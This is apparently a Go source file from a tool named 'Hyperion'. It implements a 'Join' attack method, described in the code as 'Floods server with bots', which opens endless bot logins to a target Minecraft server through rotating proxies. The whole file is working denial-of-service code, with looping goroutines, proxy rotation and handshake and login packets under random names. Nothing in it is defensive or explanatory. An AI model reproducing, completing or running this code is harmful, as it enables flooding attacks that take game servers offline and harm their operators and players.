package methods

import (
	"Hyperion/core"
	"Hyperion/core/proxy"
	"Hyperion/mc"
	"Hyperion/mc/mcutils"
	"Hyperion/utils"
	"strconv"
	"time"
)

type Join struct {
	Info         *core.AttackInfo
	ProxyManager *proxy.ProxyManager
}

var shouldRun = false

func (join Join) Name() string {
	return "Join"
}

func (join Join) Description() string {
	return "Floods server with bots"
}

func (join Join) Start() {
	shouldRun = true
	for i := 0; i < join.Info.Loops; i++ {
		go loop(&join)
	}
}

func loop(join *Join) {
	for shouldRun {
		for i := 0; i < join.Info.PerDelay; i++ {
			go connect(join)
		}
		time.Sleep(join.Info.Delay)
	}
}

func connect(join *Join) error {

	proxy := join.ProxyManager.GetNext()

	conn, err := mc.DialMC(join.Info.Ip, join.Info.Port, proxy)
	if err != nil {
		return err
	}

	port, perr := strconv.Atoi(join.Info.Port)
	if perr != nil {
		join.ProxyManager.Remove(proxy)
		return perr
	}

	mcutils.WriteHandshake(conn, join.Info.Ip, port, join.Info.Protocol, mcutils.Login)
	mcutils.WriteLoginPacket(conn, utils.RandomName(16), false, nil)
	return nil
}

func (join Join) Stop() {
	shouldRun = false
}
